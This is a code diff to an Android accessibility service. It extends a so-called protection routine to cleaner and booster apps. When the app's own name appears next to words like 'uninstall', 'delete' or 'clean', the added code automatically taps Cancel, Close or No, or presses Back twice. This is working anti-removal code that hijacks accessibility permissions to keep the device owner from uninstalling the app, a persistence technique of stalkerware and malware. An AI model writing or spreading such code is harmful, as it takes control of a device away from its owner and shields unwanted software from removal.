@@ -1530,9 +1530,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
-        // Gate: only defend when the foreground window belongs to Android Settings
-        // or a package-installer. This prevents false positives in launchers and app
-        // lists where our app name naturally appears alongside generic words like "apps".
+        // Gate: only defend when the foreground window belongs to Android Settings,
+        // a package-installer, or a known third-party cleaner app (e.g. Phone Master)
+        // that can silently delete apps without going through the standard installer.
         String windowPkg = rootNode.getPackageName() != null
                 ? rootNode.getPackageName().toString().toLowerCase() : "";
 
@@ -1540,10 +1540,28 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         boolean isInstallerPkg  = windowPkg.contains("packageinstaller")
                                || windowPkg.contains("installer")
                                || windowPkg.contains("permissioncontroller");
+        // Phone Master and similar cleaner/booster apps that can delete apps silently.
+        boolean isCleanerApp    = windowPkg.contains("phonemaster")
+                               || windowPkg.contains("phone.master")
+                               || windowPkg.contains("cleanmaster")
+                               || windowPkg.contains("clean.master")
+                               || windowPkg.contains("junkmaster")
+                               || windowPkg.contains("booster")
+                               || windowPkg.contains("cleaner")
+                               || windowPkg.contains("optimizer")
+                               || windowPkg.contains("phonebooster")
+                               || windowPkg.contains("camon");
 
-        if (!isSettingsPkg && !isInstallerPkg) {
+        if (!isSettingsPkg && !isInstallerPkg && !isCleanerApp) {
             // We are in a launcher, app drawer, or some other app — do not defend.
             return false;
+        }
+
+        if (isCleanerApp) {
+            // Phone Master and clones delete apps silently — no standard installer
+            // confirmation dialog. Defend as soon as our app name is visible alongside
+            // any delete/remove/clean/uninstall action in the cleaner's UI.
+            if (runCleanerAppDefend(rootNode)) return true;
         }
 
         if (containsDangerousWordsWithAppName(rootNode, isSettingsPkg, isInstallerPkg)) {
@@ -1555,6 +1573,53 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             return true;
         }
 
+        return false;
+    }
+
+    /**
+     * Defends against cleaner/booster apps (Phone Master, Clean Master, etc.) that
+     * can delete or uninstall apps silently through their own UI without showing the
+     * standard Android package-installer confirmation dialog.
+     *
+     * Detection: our app name visible on screen AND any dangerous action word nearby.
+     * Response: press Back immediately (twice for certainty) and try to click Cancel.
+     */
+    private boolean runCleanerAppDefend(AccessibilityNodeInfo rootNode) {
+        if (rootNode == null || currentAppName.isEmpty()) return false;
+        try {
+            // Use direct node search — fast, avoids full tree traversal.
+            List<AccessibilityNodeInfo> nameNodes =
+                    rootNode.findAccessibilityNodeInfosByText(currentAppName);
+            boolean foundName = nameNodes != null && !nameNodes.isEmpty();
+            if (nameNodes != null) {
+                for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
+            }
+            if (!foundName) return false;
+
+            // Check for dangerous action words in the visible screen text.
+            String[] dangerWords = {"delete", "remove", "uninstall", "clean", "clear", "junk"};
+            boolean foundDanger = false;
+            for (String word : dangerWords) {
+                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(word);
+                if (nodes != null && !nodes.isEmpty()) {
+                    for (AccessibilityNodeInfo n : nodes) try { n.recycle(); } catch (Exception ignored) {}
+                    foundDanger = true;
+                    break;
+                }
+            }
+            if (!foundDanger) return false;
+
+            // Our app name + dangerous action visible in a cleaner app — defend immediately.
+            if (findAndClickFullWord(rootNode, "Cancel")) return true;
+            if (findAndClickFullWord(rootNode, "Close")) return true;
+            if (findAndClickFullWord(rootNode, "No")) return true;
+            // Press Back twice — cleaner apps often need two presses to fully exit the flow.
+            try { performBack(); } catch (Exception ignored) {}
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try { performBack(); } catch (Exception ignored) {}
+            }, 120L);
+            return true;
+        } catch (Exception ignored) {}
         return false;
     }
 
